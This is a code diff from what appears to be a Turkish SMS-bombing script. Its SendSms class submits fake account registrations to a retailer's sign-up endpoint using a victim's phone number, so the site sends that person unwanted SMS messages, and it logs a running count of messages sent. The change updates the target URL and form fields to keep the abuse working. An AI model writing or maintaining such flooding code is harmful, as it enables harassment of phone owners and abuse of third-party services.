@@ -258,21 +258,19 @@ class SendSms():
 
                 try:
 
-                    naosstars = requests.post("https://shop.naosstars.com/users/register/", data={
+                    naosstars = requests.post("https://naosstars.com/user/register/", data={
 
-                    "email": self.mail,
+                    
 
                     "first_name": "Memati",
 
                     "last_name": "Bas",
 
-                    "password": "31ABC..abc31",
-
-                    "date_of_birth": "1975-12-31",
+                    "email": self.mail,
 
                     "phone": f"0{numara}",
 
-                    "gender": "male",
+                    "password": "31ABC..abc31",
 
                     "kvkk": "true",
 
@@ -284,7 +282,7 @@ class SendSms():
 
                     if naosstars.status_code == 202:
 
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> shop.naosstars.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> naosstars.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
 
                         self.adet += 1
 
@@ -296,7 +294,7 @@ class SendSms():
 
                 except:
 
-                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> shop.naosstars.com "+numara)
+                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> naosstars.com "+numara)
 
                 uygulanan_nolar += 1
 
